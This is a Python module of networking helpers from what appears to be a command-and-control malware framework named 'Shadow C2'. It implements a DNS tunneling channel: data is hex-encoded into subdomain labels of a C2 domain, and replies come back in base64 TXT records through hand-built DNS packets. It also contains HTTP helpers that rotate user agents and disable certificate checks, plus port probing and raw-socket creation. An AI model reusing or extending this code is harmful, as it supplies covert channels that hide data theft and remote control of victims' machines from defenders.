#!/usr/bin/env python3
"""
Shadow C2 — Network Utilities
Raw HTTP, DNS encoding, socket helpers.
"""

import socket
import struct
import urllib.request
import urllib.error
import ssl
import json
import random
from typing import Optional

from server.config import USER_AGENTS


# ---------------------------------------------------------------------------
# IP utilities
# ---------------------------------------------------------------------------

def get_public_ip() -> str:
    """Fetch public IP via api.ipify.org."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request("https://api.ipify.org?format=text")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return resp.read().decode().strip()
    except Exception:
        return "0.0.0.0"


def get_local_ip() -> str:
    """Get local network IP."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ---------------------------------------------------------------------------
# Port / host checks
# ---------------------------------------------------------------------------

def is_port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    """Quick TCP connect check."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except Exception:
        return False


def resolve_hostname(hostname: str) -> str:
    """Resolve hostname to IP."""
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return ""


def reverse_dns(ip: str) -> str:
    """Reverse DNS lookup."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return ""


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

class SimpleResponse:
    """Minimal response object."""
    def __init__(self, status: int, headers: dict, body: bytes, url: str = ""):
        self.status_code = status
        self.headers = headers
        self.body = body
        self.url = url

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def json(self) -> dict:
        return json.loads(self.body)


def get_http_headers(url: str, timeout: float = 5.0) -> dict:
    """Fetch only HTTP headers (HEAD request)."""
    try:
        req = urllib.request.Request(url, method="HEAD")
        req.add_header("User-Agent", random.choice(USER_AGENTS))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            return dict(resp.headers)
    except Exception:
        return {}


def make_request(url: str, method: str = "GET", headers: dict = None,
                 data: bytes = None, timeout: float = 10.0,
                 proxy: str = None, verify_ssl: bool = False) -> SimpleResponse:
    """
    Make an HTTP request using urllib (no requests dependency for core).
    """
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = random.choice(USER_AGENTS)

    req = urllib.request.Request(url, data=data, headers=headers, method=method)

    ctx = ssl.create_default_context()
    if not verify_ssl:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx)
    )
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({
            "http": proxy, "https": proxy
        })
        opener = urllib.request.build_opener(
            proxy_handler,
            urllib.request.HTTPSHandler(context=ctx)
        )

    try:
        with opener.open(req, timeout=timeout) as resp:
            return SimpleResponse(
                status=resp.status,
                headers=dict(resp.headers),
                body=resp.read(),
                url=resp.url
            )
    except urllib.error.HTTPError as e:
        return SimpleResponse(
            status=e.code,
            headers=dict(e.headers) if e.headers else {},
            body=e.read() if e.fp else b"",
            url=url
        )
    except Exception as e:
        return SimpleResponse(status=0, headers={}, body=str(e).encode(), url=url)


# ---------------------------------------------------------------------------
# DNS encoding helpers (for DNS tunneling channel)
# ---------------------------------------------------------------------------

def encode_dns_labels(data: bytes, domain: str, max_label: int = 63) -> str:
    """
    Encode binary data as DNS subdomain labels.
    data -> hex -> split into max_label-char labels -> join with dots -> append domain.
    Example: b'\\x01\\x02' -> '0102.c2.example.com'
    """
    hex_data = data.hex()
    labels = [hex_data[i:i + max_label] for i in range(0, len(hex_data), max_label)]
    return ".".join(labels) + "." + domain


def decode_dns_labels(qname: str, domain: str) -> bytes:
    """
    Decode data from DNS subdomain labels.
    '0102.c2.example.com' -> b'\\x01\\x02'
    """
    suffix = "." + domain
    if qname.endswith(suffix):
        qname = qname[: -len(suffix)]
    elif qname.endswith(suffix + "."):
        qname = qname[: -len(suffix) - 1]
    hex_data = qname.replace(".", "")
    return bytes.fromhex(hex_data)


# ---------------------------------------------------------------------------
# DNS packet construction (raw)
# ---------------------------------------------------------------------------

def build_dns_query_packet(domain: str, query_type: int = 1,
                           transaction_id: int = None) -> bytes:
    """
    Build a raw DNS query packet.
    query_type: 1=A, 5=CNAME, 16=TXT, 28=AAAA
    """
    if transaction_id is None:
        transaction_id = random.randint(0, 0xFFFF)

    # Header: ID(2) Flags(2) QDCOUNT(2) ANCOUNT(2) NSCOUNT(2) ARCOUNT(2)
    flags = 0x0100  # Standard query, recursion desired
    header = struct.pack("!HHHHHH", transaction_id, flags, 1, 0, 0, 0)

    # Question: QNAME + QTYPE(2) + QCLASS(2)
    qname = b""
    for label in domain.rstrip(".").split("."):
        encoded = label.encode()
        qname += struct.pack("!B", len(encoded)) + encoded
    qname += b"\x00"  # root label

    question = qname + struct.pack("!HH", query_type, 1)  # class IN
    return header + question


def parse_dns_query_packet(data: bytes) -> dict:
    """
    Parse incoming DNS query packet.
    Returns {transaction_id, flags, qname, qtype, qclass}.
    """
    if len(data) < 12:
        return None

    tid, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", data[:12])
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        offset += 1
        if length == 0:
            break
        if length >= 0xC0:  # pointer
            offset += 1
            break
        labels.append(data[offset:offset + length].decode(errors="replace"))
        offset += length

    qname = ".".join(labels)
    qtype = struct.unpack("!H", data[offset:offset + 2])[0] if offset + 2 <= len(data) else 1
    qclass = struct.unpack("!H", data[offset + 2:offset + 4])[0] if offset + 4 <= len(data) else 1

    return {
        "transaction_id": tid,
        "flags": flags,
        "qname": qname,
        "qtype": qtype,
        "qclass": qclass,
    }


def build_dns_response_packet(transaction_id: int, qname: str,
                               qtype: int, response_data: bytes) -> bytes:
    """
    Build a DNS response with TXT record containing response_data.
    """
    import base64
    # Header
    flags = 0x8180  # Response, recursion available, no error
    header = struct.pack("!HHHHHH", transaction_id, flags, 1, 1, 0, 0)

    # Question section
    qname_encoded = b""
    for label in qname.rstrip(".").split("."):
        enc = label.encode()
        qname_encoded += struct.pack("!B", len(enc)) + enc
    qname_encoded += b"\x00"
    question = qname_encoded + struct.pack("!HH", qtype, 1)

    # Answer section (TXT record)
    b64_data = base64.b64encode(response_data)
    # Split into 255-byte chunks (TXT record limit)
    chunks = [b64_data[i:i + 255] for i in range(0, len(b64_data), 255)]

    txt_rdata = b""
    for chunk in chunks:
        txt_rdata += struct.pack("!B", len(chunk)) + chunk

    # Name pointer to question
    answer = struct.pack("!H", 0xC00C)  # pointer to qname in question
    answer += struct.pack("!HH", 16, 1)  # TXT, IN
    answer += struct.pack("!I", 300)  # TTL
    answer += struct.pack("!H", len(txt_rdata))
    answer += txt_rdata

    return header + question + answer


# ---------------------------------------------------------------------------
# Raw socket creation
# ---------------------------------------------------------------------------

def create_raw_socket(protocol: int = socket.IPPROTO_ICMP) -> socket.socket:
    """Create a raw socket. Requires root/CAP_NET_RAW."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    except PermissionError:
        raise PermissionError("Raw sockets require root privileges (or CAP_NET_RAW)")


def calculate_checksum(data: bytes) -> int:
    """Internet checksum (one's complement of one's complement sum)."""
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF
